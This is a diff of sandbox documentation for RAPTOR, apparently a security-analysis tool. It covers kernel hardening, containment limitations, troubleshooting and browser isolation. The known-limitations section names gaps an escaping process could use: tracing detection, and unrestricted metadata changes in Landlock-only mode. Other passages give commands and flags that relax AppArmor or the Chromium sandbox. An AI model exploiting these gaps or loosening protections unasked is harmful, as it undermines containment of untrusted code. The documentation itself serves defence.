+  through the proxy's resolver.
+- **Network-layer enforcement.** The firewall or proxy should run on
+  a device or system outside the analysis host itself. Rules applied
+  only inside the host are bypassable by anything running as the
+  same UID or as root.
+
+### Kernel hardening
+
+- Keep the kernel patched.
+- Enable unprivileged user namespaces where possible — RAPTOR's
+  strongest isolation tier (mount-ns + PID-ns + network-ns) requires
+  them.
+- Disable or restrict `bpf()`, `userfaultfd`, `io_uring` at the
+  sysctl level. The sandbox's seccomp filter blocks these per-child,
+  but a host-wide restriction covers processes outside the sandbox.
+
+---
+
+## Known limitations
+
+- **Read restriction is strongest for untrusted runs.** The untrusted
+  entry points default to the kernel-level read allowlist; other
+  sandbox uses opt in. On Landlock-only hosts (Ubuntu 24.04 default)
+  the read restriction is the load-bearing credential-exfiltration
+  defence.
+- **Orphan-leak potential.** If the RAPTOR parent dies with a hard
+  SIGKILL, deeply nested grandchildren may survive briefly until the
+  PID namespace reaps them (seconds in practice).
+- **`io_uring` is hard-denied everywhere** — its file operations bypass
+  syscall tracing, so it is blocked even in audit mode rather than left
+  as an untraceable surface.
+- **Audit mode is for operator workflows, not malware analysis** —
+  code in an audited sandbox can detect tracing (TracerPid, timing).
+- **Metadata operations are unrestricted in Landlock-only mode.**
+  Landlock has no access right covering metadata-only syscalls, so a
+  child can chmod/chown/setxattr/utimensat any same-UID file outside
+  the writable allowlist (content reads/writes stay blocked). Seccomp
+  cannot close this either — the target path lives behind a pointer
+  argument that classic BPF cannot dereference. Mount-ns mode closes
+  it (read-only binds refuse metadata writes with EROFS). Runs in
+  this posture stamp `sandbox_info["landlock_metadata_ops_unrestricted"]`
+  so downstream readers do not treat file modes/timestamps observed
+  after such a run as trustworthy.
+
+---
 
 ## Troubleshooting
 
 ### "Mount namespace unavailable" on Ubuntu 24.04
 
 Ubuntu 24.04 ships with an AppArmor sysctl that blocks unprivileged
-user-namespace mount operations. The sandbox still applies Landlock, seccomp,
-network/PID/IPC namespaces, and rlimits — but it can't provide read-only bind
-mounts for `target`, `output`, or a fresh `/tmp`.
+user-namespace mount operations. The sandbox still applies Landlock,
+seccomp, network/PID/IPC namespaces, and rlimits -- but it cannot
+provide read-only bind mounts for target/output or a fresh `/tmp`.
 
 Both prerequisites must be met to enable mount-ns:
 
@@ -682,226 +1501,215 @@ Both prerequisites must be met to enable mount-ns:
 # 1. Allow unprivileged user namespaces (no reboot needed)
 sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0
 
-# 2. Install newuidmap/newgidmap (setuid-root helpers that set up
-#    the uid_map — direct /proc/self/uid_map writes fail EPERM for
-#    unprivileged callers)
+# 2. Install newuidmap/newgidmap (setuid-root helpers)
 sudo apt install uidmap
 ```
 
-The probe reports whichever prerequisite is missing. With both in
-place, mount-ns engages automatically on the next sandbox() call — no
-code changes, no profile flag. Without either, the sandbox silently
-falls back to Landlock-only (writes restricted, reads wide by default
-plus optional `restrict_reads=True`). Landlock alone already covers the
-main threat model (no writes outside `output`, no reads of credentials
-under `restrict_reads`); mount-ns adds per-sandbox `/tmp`, invisible
-host paths outside the bind-mounts, and stronger `/dev/shm` isolation.
+If user, network, PID, and IPC namespaces are available but bind mounts
+fail, the sandbox retains those namespaces and uses Landlock read/write
+rules in place of the bind tree for trusted tool runs. Host paths remain
+visible by name and metadata-only operations are outside Landlock's control.
+Untrusted execution refuses both this tier and the namespace-less fallback.
+Consent to the reduced containment only explicitly: `--sandbox-floor
+landlock` (this run), `/project set sandbox-floor landlock` (standing
+for the project), or `RAPTOR_ALLOW_DEGRADED_UNTRUSTED=1` (host-wide;
+see [environment.md](environment.md)).
 
 ### A target binary fails with EACCES reading `/home/<user>/...`
 
-Tools that hardcode absolute paths under `/home/<user>/` (not `$HOME`) will
-hit the Landlock read-restriction even under `fake_home=True`. Either:
-
-- add the specific path to `readable_paths=[...]`
-- pre-populate the fake home and let the tool resolve via `$HOME`
-- run under `sandbox()` with `restrict_reads=False` if the tool is trusted
+Tools that hardcode absolute paths under `/home/<user>/` (not `$HOME`)
+hit the read restriction even with the fake home. Add the specific
+path with `--sandbox-readable-path`, or pre-populate the fake home and
+let the tool resolve via `$HOME`.
 
 ### Shell scripts fail on `>/dev/null 2>&1`
 
-`/dev/null` writes are permitted by a narrow Landlock rule. If you see EACCES
-on `/dev/null`, you're likely running on a kernel without Landlock ABI v3
-(TRUNCATE) — the probe will warn. Upgrade to 5.19+.
+`/dev/null` writes are permitted by a narrow Landlock rule. If you see
+EACCES on `/dev/null`, check for a custom readable/writable path
+override that displaced the curated `/dev` grants.
 
 ### Rust `cargo build` fails at the linker stage
 
-`std::process::Command` in Rust uses `socketpair(AF_UNIX, ...)` for its internal
-error-reporting channel. The sandbox permits this (explicit seccomp allow).
-If you see EPERM on `socketpair` itself, you're on a seccomp profile that does
-not include the sandbox package's built-in allowlist — check for a custom
-`seccomp` override.
+Rust's `std::process::Command` uses `socketpair(AF_UNIX, ...)`
+internally; the sandbox permits this explicitly. If you see EPERM on
+`socketpair` itself, check for a custom seccomp override.
+
+### EPERM creating unix sockets inside the sandbox
+
+`socket(AF_UNIX)` is permitted only on the full mount-namespace lane
+(a fresh tmpfs masks the host's pathname sockets and abstract sockets
+are namespace-scoped there). A call the sandbox demotes to a weaker
+lane — the command resolves outside the mount bind tree, a previous
+exec failure was cached for that binary, or a namespace failed at
+runtime — runs under a seccomp policy that denies unix-socket
+*creation* unconditionally, so the same tool can see EPERM on one
+invocation and not the next. Tools that host a socket server inside
+the sandbox should be handed an inherited, already-connected
+`socketpair` half instead of creating their own listener (inherited
+descriptors are admitted; creation is what the policy blocks). The
+persistent Ghidra decompile server does this automatically: a boot
+that dies at socket setup with EPERM is retried once on its
+inherited-socketpair transport and the run continues.
 
 ### CodeQL "Failed to download pack"
 
-The egress proxy allowlist needs the full set of GHCR hosts. Use:
+The egress proxy allowlist needs the full set of GHCR hosts:
+`ghcr.io`, `codeload.github.com`, `objects.githubusercontent.com`,
+`pkg-containers.githubusercontent.com`.
 
-```python
-proxy_hosts=[
-    "ghcr.io",
-    "codeload.github.com",
-    "objects.githubusercontent.com",
-    "pkg-containers.githubusercontent.com",
-]
-```
+---
 
-## Integrity guard
+## Namespace supervision outside the sandbox
 
-The sandbox includes a runtime self-test on first use — it forks a child,
-installs Landlock with `WRITE_FILE` and `READ_FILE` restrictions, and verifies
-both are actually enforced. If the UAPI constants ever drift (kernel header
-changes, version mismatch), this test fails loudly instead of silently granting
-all access.
+The sandbox is not RAPTOR's only namespace user. The Joern analysis
+server boots inside its own private network namespace (its TCP port
+and per-boot credential are reachable only through a unix socket the
+forwarder owns), and on hosts that allow it the same single unshare
+call also creates a pid namespace: the forwarder then supervises the
+whole server tree, so one verified kill of one process tears down the
+JVM and every helper with kernel-guaranteed delivery instead of
+process-group enumeration.
 
-A static UAPI regression test
-(`test_e2e_sandbox.py::TestE2ELandlockBitValues::test_access_bits_match_uapi`)
-pins the bit values against `/usr/include/linux/landlock.h`.
+This is process-tree containment for one of RAPTOR's own trusted
+services, not the security sandbox this document describes — no
+Landlock, seccomp, or filesystem confinement applies to the Joern
+server through it.
 
-## Module layout
+Capability degradation is automatic and visible, never fatal: the
+kernel is probed before the tier engages (the verdict is cached for
+the process's lifetime and re-probed only after a runtime refusal);
+a pid-namespace refusal (common under
+the same AppArmor userns gating covered in
+[Troubleshooting](#troubleshooting)) degrades that server to
+process-group supervision; and every boot logs one posture line
+(`Joern server supervision tier: pidns` or `group`) naming the tier
+actually achieved — plus the refusal reason when a runtime refusal
+forced the degrade.
 
-```
-core/sandbox/
-├── __init__.py        # public API + threat-model docstring
-├── context.py         # sandbox(), run(), run_trusted(), run_untrusted()
-├── profiles.py        # named profile definitions
-├── cli.py             # --sandbox / --no-sandbox argparse integration
-├── probes.py          # per-layer availability detection
-├── _spawn.py          # Linux: fork+newuidmap+pivot_root+Landlock+seccomp
-├── mount_ns.py        # Linux: ctypes mount() / pivot_root() for _spawn
-├── mount.py           # Linux: legacy shell-script mount builder
-├── landlock.py        # Linux: Landlock ABI + rule construction
-├── seccomp.py         # Linux: seccomp-bpf syscall filters
-├── preexec.py         # POSIX: preexec_fn composition (rlimits)
-├── proxy.py           # cross-platform: HTTPS-CONNECT egress proxy
-├── observe.py         # cross-platform: sandbox_info attachment
-├── state.py           # cross-platform: singletons + cached state
-├── _macos_spawn.py    # macOS: sandbox-exec wrapper
-├── seatbelt.py        # macOS: SBPL profile generator
-└── seatbelt_audit.py  # macOS: `log stream` capture + JSONL append
-```
+---
 
-See the module docstring in `core/sandbox/__init__.py` for the current
-threat-model statement — what the sandbox does and does not protect against.
+## Related documentation
 
-## macOS backend
+- [Commands reference](commands.md) -- CLI flags (`--sandbox`,
+  `--audit`, `--audit-verbose`, `--audit-budget`).
+- [Security model](security.md) -- how the sandbox fits RAPTOR's own
+  threat model.
+- [Fuzzing](fuzzing.md) -- fuzz target execution under sandbox
+  isolation.
+- [Frida](frida.md) -- Frida instrumentation using the `frida` profile.
+- [Crash analysis](crash-analysis.md) -- GDB under `debug` and rr replay under `rr`
+  profile.
 
-On Darwin, the sandbox routes through `core.sandbox._macos_spawn`
-instead of the Linux `_spawn.run_sandboxed()`. The kwarg surface is
-identical — callers don't need to switch on platform — but the
-underlying mechanism is `sandbox-exec(1)` + the kernel `Sandbox.kext`
-applying an SBPL (Sandbox Profile Language) profile.
+The module docstring in `core/sandbox/__init__.py` carries the current
+threat-model statement -- what the sandbox does and does not protect
+against.
 
-### What works the same
 
-- `sandbox()`, `run()`, `run_trusted()`, `run_untrusted()` — same
-  context-manager + helper surface.
-- `block_network=True`, `allowed_tcp_ports=`, `use_egress_proxy=`,
-  `proxy_hosts=` — translated to SBPL `(deny network*)` / `(allow
-  network-outbound (remote tcp ...))` / loopback proxy port allow.
-- `target=`, `output=`, `writable_paths=` — translated to SBPL
-  `(deny file-write* (require-not (subpath ...)))`. Paths are
-  realpath-canonicalised because SBPL's `(subpath ...)` matches the
-  canonical resolved path (macOS has pervasive symlinks like `/var
-  → /private/var`).
-- `restrict_reads=True`, `readable_paths=` — translated to SBPL
-  `(deny file-read* (require-not ...))` with the same system-dirs
-  allowlist (`/usr`, `/System`, `/Library/Frameworks`, `/private/etc`,
-  `/dev`).
-- `fake_home=True` — env-side; sets `HOME` and `XDG_*_HOME` to the
-  per-sandbox `{output}/.home/`. Same env-mutation as Linux.
-- `audit=True` / `--audit` CLI flag — replaces the file-write deny
-  with `(allow file-write* (with report))`. The kernel emits a
-  Sandbox.kext log entry for each write; `seatbelt_audit.LogStreamer`
-  reads `log stream` ndjson output, parses with the spike-validated
-  regex, and appends records to `<run>/.sandbox-denials.jsonl`
-  matching the Linux ptrace-tracer schema. `summarize_and_write`
-  works unchanged.
-- `limits=` — POSIX setrlimit via the same preexec_fn pattern.
-- Sandbox-summary aggregation (`summarize_and_write`,
-  `record_audit_degraded`, `proxy-events.jsonl`) — identical
-  cross-platform.
+### Browser containment
 
-### What's different (platform limits)
+Web scans with `--browser` run Playwright's Node driver and its Chromium process
+tree inside the `chromium` profile. Only installed runtime resources and private
+scratch are admitted. The driver receives a small environment without account
+credentials, trust markers or user Node startup options. Screenshots are returned
+through Playwright to the parent. The driver has a five-minute wall timeout,
+a 128 MiB per-file limit and a 120-second CPU limit; virtual address space is
+uncapped because V8 reserves large address ranges.
 
-| Linux feature                | macOS status   | Why / mitigation                                               |
-| ---------------------------- | -------------- | -------------------------------------------------------------- |
-| PID namespace                | ⚠ absent       | No unprivileged equivalent on macOS. Host PIDs visible.        |
-| Mount namespace + pivot_root | ⚠ absent       | `restrict_reads=True` is the substitute (read-deny via SBPL).  |
-| `RLIMIT_NPROC` per-namespace | weaker         | macOS rlimit is per-UID host-wide. Lower the limit on Darwin.  |
-| `seccomp_profile=full`       | partial        | Mapped to `(deny process-info* (target others))` — coarse.     |
-| `audit_verbose` (per-syscall)| partial        | SBPL `(allow X (with report))` for an extended category set    |
-|                              |                | (file-read*, mach-lookup, process-exec*, process-fork, signal, |
-|                              |                | iokit-open, sysctl-read, process-info*). Coarser than seccomp's|
-|                              |                | per-syscall trace and no argv, but operationally similar.      |
-| `--audit-budget=N`           | full           | Same `audit_budget.AuditBudget` module on both backends —      |
-|                              |                | token-bucket + per-category + per-PID + 1-in-N sampling.       |
-| `map_root` (UID re-mapping)  | ⚠ absent       | macOS sandbox-exec keeps caller UID.                           |
-| `--sandbox debug` (lldb)     | full           | Same intent as Linux: full enforcement EXCEPT keep debugger    |
-|                              |                | introspection unrestricted. macOS skips the process-info-*     |
-|                              |                | denies under debug so lldb / sample / dtrace can attach.       |
+Chromium's own sandbox defaults on. RAPTOR checks the actual browser command line
+and refuses runtime flags that disable it. If either required layer cannot start,
+browser checks are unavailable; other web checks can continue and the scan result
+records the coverage gap. There is no automatic retry without protection.
+`--allow-unsandboxed-chromium` explicitly waives only Chromium's inner sandbox.
+The waiver is logged and recorded in `browser_isolation` in the JSON result;
+RAPTOR's outer confinement remains required.
 
-### macOS-specific operator notes
+The Linux profile maps the operator to a nonzero namespace UID, with no new host
+identity or privileges. It permits Chromium's nested user/PID/network namespace
+creation and shared-memory memfds. Mount/IPC/UTS/cgroup/time namespace creation,
+setns, clone3, ptrace, perf counters and `execveat(AT_EMPTY_PATH)` remain restricted.
+The memfd/JIT support means this profile does not enforce W^X or forbid all
+fileless execution. Nested
+namespace rules and Landlock restrictions are inherited. Chromium must write
+namespace ID maps for newly created children, so the profile admits writes to its
+fresh PID-namespace procfs; global proc control subtrees are remounted read-only
+before execution. The private init waiter is made non-dumpable before the target
+fork so its memory and descriptor interfaces remain protected. This allowance
+is forbidden on fallback, host-procfs and image
+rootfs lanes. Normal profiles retain their existing namespace and memfd denies.
 
-- **First-run cost**: `check_seatbelt_available()` invokes
-  `sandbox-exec` with a minimal `(allow default)` profile against
-  `/usr/bin/true` once per process to verify the kernel sandbox is
-  functional. ~50ms.
-- **No `(deny default)`**: pure deny-default profiles SIGABRT modern
-  macOS binaries before dyld can load libSystem (spike-validated).
-  We always use `(allow default)` + targeted denies.
-- **Default exception list**: `/private/tmp` is always added to the
-  write-allowlist exception so standard `tempfile.mkstemp()` works.
-  This matches Linux's default `/tmp` writable.
-- **Audit log latency**: kernel → log subsystem → `log stream`
-  pipeline has ~tens-of-ms latency for steady-state and ~1.5s for a
-  cold first event. `LogStreamer.stop(drain_timeout=1.5)` accounts
-  for this; very short workloads may drop the last record.
+TCP connections are restricted to the target and configured proxy ports. This is
+a port restriction, not a destination-host firewall; DNS/UDP is not restricted by
+the TCP allowlist. Existing HTTP and WebSocket origin gates remain active. Browser
+runtime files, the kernel and Playwright's parent-side protocol parser remain
+trusted components. Linux requires a non-root operator, Landlock ABI 4+, seccomp and usable mount/PID
+namespaces; macOS requires Seatbelt. Native acceptance must run on each platform
+before compatibility is claimed.
 
-### Audit budget (cross-platform)
 
-Both backends route audit-record decisions through one shared module
-(`core.sandbox.audit_budget.AuditBudget`). The budget composes four
-mechanisms:
+### Nested confinement in the Linux devcontainer
 
-1. **Global cap** — `--audit-budget=N` (default 10000). Hard ceiling
-   on records per run.
-2. **Per-category sub-cap** — file-read-metadata (500), file-write
-   (3000), mach-lookup (1000), etc. Stops one chatty category from
-   squeezing important low-volume categories out of the global pool.
-3. **Per-PID sub-cap** — default 5000. One spamming subprocess can't
-   dominate the JSONL.
-4. **Token-bucket refill** — burst capacity = cap, sustained rate =
-   refill rate. Long-running workloads at low steady-state never trip.
-5. **1-in-N post-cap sampling** — high-volume categories
-   (file-read-metadata, file-read-data, process-info, iokit-open,
-   sysctl-read) keep emitting a trickle even after their bucket
-   empties so operators see "still happening".
+The devcontainer keeps a non-root runtime user, the ordinary Docker capability
+set plus SYS_PTRACE, and Docker's PID/network/device isolation. It does not use
+privileged mode or add SYS_ADMIN. Its runtime disables Docker's seccomp and
+AppArmor profiles and procfs masking so RAPTOR can create nested mount/PID
+namespaces and mount fresh procfs. This removes those outer-container controls
+for the whole session, including ordinary shell commands; RAPTOR's per-child
+policies apply only to commands dispatched through its sandbox wrappers.
 
-Markers and a final summary record appear in the JSONL alongside
-data records — operators see `category_budget_exceeded`,
-`pid_budget_exceeded`, `category_budget_exceeded_sampling`, and
-`audit_summary` types in the same file.
+When a setuid UID mapper is unusable inside a container, the single-ID backend
+can ask the kernel to map the caller's own UID/GID directly, after denying
+setgroups. It grants no subordinate ranges or other host identities. Rootfs
+range mappings and the custom setgroups-preserving helper do not use this
+alternative. A failed mapping or missing namespace capability still refuses
+strict browser execution.
 
-CLI:
+Browser scratch uses a short, private directory under `/tmp` (covered by the
+abandoned-directory reaper), because session directory names can exceed the
+pathname Unix-socket limit used by distro Chromium.
+The browser driver keeps its disposable HOME and XDG state under its granted
+work directory, rather than the staged namespace tmpfs home. Its 256-task limit
+includes Linux threads and accommodates the distro Chromium process tree.
+The image publication gate checks JavaScript execution and both inner-sandbox
+modes against the installed Debian browser with a read-only source mount.
 
-```bash
-raptor scan target/  --sandbox full --audit                    # default 10000
-raptor scan target/  --sandbox full --audit --audit-budget 100 # quick diag
-raptor scan target/  --sandbox full --audit --audit-verbose --audit-budget 50000  # long run
-```
 
-The defaults in `core.sandbox.audit_budget.DEFAULT_*` are tuned as
-starting heuristics for typical `/scan` and `/agentic` workloads.
-After first deployment, measure real workload distributions and
-re-tune if entire categories disappear into the dropped bucket
-(too tight) or the JSONL still bloats (too lax).
+### Chromium sandbox nesting on macOS
 
-### Backend selection
+RAPTOR probes whether the selected Chromium can initialise its GPU/renderer
+sandbox under the actual outer Seatbelt policy before visiting a target. The
+probe renders a disposable blank page, captures a frame and evaluates a constant
+expression with both sandbox layers enabled. It uses no proxy, account state or target request.
+Permissive `sandbox-exec` nesting alone does not prove this compatibility. A
+failed probe refuses default browser startup with an actionable message. Other web checks can continue with the browser coverage gap recorded.
 
-`core/sandbox/context.py` dispatches at the spawn-eligibility check:
+On a host where this two-layer browser probe fails, the operator must explicitly
+select `--allow-unsandboxed-chromium` to use browser checks under RAPTOR's outer
+Seatbelt confinement. There is no automatic retry or default waiver. Linux
+retains its existing two-layer path. The result is cached per process. The actual
+browser must still start and pass its policy checks; there is no automatic fallback if it later fails.
 
-```
-if sys.platform == "darwin":
-    use_seatbelt = use_sandbox and check_seatbelt_available()
-else:
-    use_mount = use_sandbox and ... and check_mount_available()
-```
+Native macOS acceptance records required-mode refusal when nesting is unavailable
+and exercises DOM/XSS/origin behavior with the waiver explicitly selected in the
+test fixture. This validates the available outer-only mode, not two-layer macOS
+compatibility. The required-mode test reports that distinction in its JUnit
+suite properties (compatible with xUnit2). The native boundary probe remains
+required in either case.
 
-`spawn_eligible` triggers either backend; the post-run aggregation
-(proxy events, `_check_blocked` engagement booleans, sandbox-summary
-JSONL) is platform-independent.
+### Early strict scan checks
 
-### Spike scripts
+`python3 raptor.py scan --repo /path/to/repo --sandbox strict` checks strict
+backend availability before creating a scan run or starting a scanner worker.
+Direct static-analysis workers perform the same preflight before cloning or
+creating scan scratch space. Unsupported isolation returns exit code **3**.
+The preflight shares requirements and diagnostics with the sandbox context;
+it does not replace enforcement checks when an actual child starts.
 
-Phase 0 design spikes are in `scripts/macos_sandbox_spike{1,2,3,4}.py`
-— each validates one assumption used by `seatbelt.py` /
-`seatbelt_audit.py`. Re-run them on a new macOS major version to
-confirm the SBPL idioms haven't drifted.
+This behavior applies to every frontend. The default `full` profile keeps its
+existing degraded-isolation behavior. An outer tool sandbox or read-only
+installation does not establish the scanner's own isolation requirements.
+
+A requested `memory_max` also sets `memory.swap.max=0`: the job cannot exceed
+its resident-memory ceiling by consuming unbounded swap. Delegation must support
+both controls. ASAN virtual address reservations remain unrestricted.
+LeakSanitizer's exit-time tracing has separate compatibility constraints
+under confinement.
